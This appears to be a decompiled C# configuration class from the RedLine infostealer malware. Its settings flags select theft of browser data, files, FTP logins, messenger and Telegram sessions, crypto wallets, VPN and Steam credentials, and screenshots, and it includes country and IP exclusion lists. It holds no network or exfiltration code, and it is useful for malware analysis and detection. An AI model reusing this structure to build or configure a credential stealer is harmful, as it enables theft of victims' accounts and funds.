using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	// Token: 0x02000009 RID: 9
	[DataContract(Name = "ClientSettings", Namespace = "v1/Models")]
	public class ClientSettings
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000012 RID: 18 RVA: 0x00002623 File Offset: 0x00000823
		// (set) Token: 0x06000013 RID: 19 RVA: 0x0000262B File Offset: 0x0000082B
		[DataMember(Name = "GrabBrowsers")]
		public bool GrabBrowsers { get; set; } = true;

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000014 RID: 20 RVA: 0x00002634 File Offset: 0x00000834
		// (set) Token: 0x06000015 RID: 21 RVA: 0x0000263C File Offset: 0x0000083C
		[DataMember(Name = "GrabFiles")]
		public bool GrabFiles { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000016 RID: 22 RVA: 0x00002645 File Offset: 0x00000845
		// (set) Token: 0x06000017 RID: 23 RVA: 0x0000264D File Offset: 0x0000084D
		[DataMember(Name = "GrabFTP")]
		public bool GrabFTP { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000018 RID: 24 RVA: 0x00002656 File Offset: 0x00000856
		// (set) Token: 0x06000019 RID: 25 RVA: 0x0000265E File Offset: 0x0000085E
		[DataMember(Name = "GrabImClients")]
		public bool GrabImClients { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600001A RID: 26 RVA: 0x00002667 File Offset: 0x00000867
		// (set) Token: 0x0600001B RID: 27 RVA: 0x0000266F File Offset: 0x0000086F
		[DataMember(Name = "GrabWallets")]
		public bool GrabWallets { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600001C RID: 28 RVA: 0x00002678 File Offset: 0x00000878
		// (set) Token: 0x0600001D RID: 29 RVA: 0x00002680 File Offset: 0x00000880
		[DataMember(Name = "GrabUserAgent")]
		public bool GrabUserAgent { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600001E RID: 30 RVA: 0x00002689 File Offset: 0x00000889
		// (set) Token: 0x0600001F RID: 31 RVA: 0x00002691 File Offset: 0x00000891
		[DataMember(Name = "GrabScreenshot")]
		public bool GrabScreenshot { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000020 RID: 32 RVA: 0x0000269A File Offset: 0x0000089A
		// (set) Token: 0x06000021 RID: 33 RVA: 0x000026A2 File Offset: 0x000008A2
		[DataMember(Name = "GrabTelegram")]
		public bool GrabTelegram { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000022 RID: 34 RVA: 0x000026AB File Offset: 0x000008AB
		// (set) Token: 0x06000023 RID: 35 RVA: 0x000026B3 File Offset: 0x000008B3
		[DataMember(Name = "GrabVPN")]
		public bool GrabVPN { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000024 RID: 36 RVA: 0x000026BC File Offset: 0x000008BC
		// (set) Token: 0x06000025 RID: 37 RVA: 0x000026C4 File Offset: 0x000008C4
		[DataMember(Name = "GrabSteam")]
		public bool GrabSteam { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000026 RID: 38 RVA: 0x000026CD File Offset: 0x000008CD
		// (set) Token: 0x06000027 RID: 39 RVA: 0x000026D5 File Offset: 0x000008D5
		[DataMember(Name = "GrabPaths")]
		public IList<string> GrabPaths { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000028 RID: 40 RVA: 0x000026DE File Offset: 0x000008DE
		// (set) Token: 0x06000029 RID: 41 RVA: 0x000026E6 File Offset: 0x000008E6
		[DataMember(Name = "BlacklistedCountry")]
		public IList<string> BlacklistedCountry { get; set; }

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x0600002A RID: 42 RVA: 0x000026EF File Offset: 0x000008EF
		// (set) Token: 0x0600002B RID: 43 RVA: 0x000026F7 File Offset: 0x000008F7
		[DataMember(Name = "BlacklistedIP")]
		public IList<string> BlacklistedIP { get; set; }

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x0600002C RID: 44 RVA: 0x00002700 File Offset: 0x00000900
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00002708 File Offset: 0x00000908
		[DataMember(Name = "PortablePaths")]
		public IList<string> PortablePaths { get; set; }
	}
}
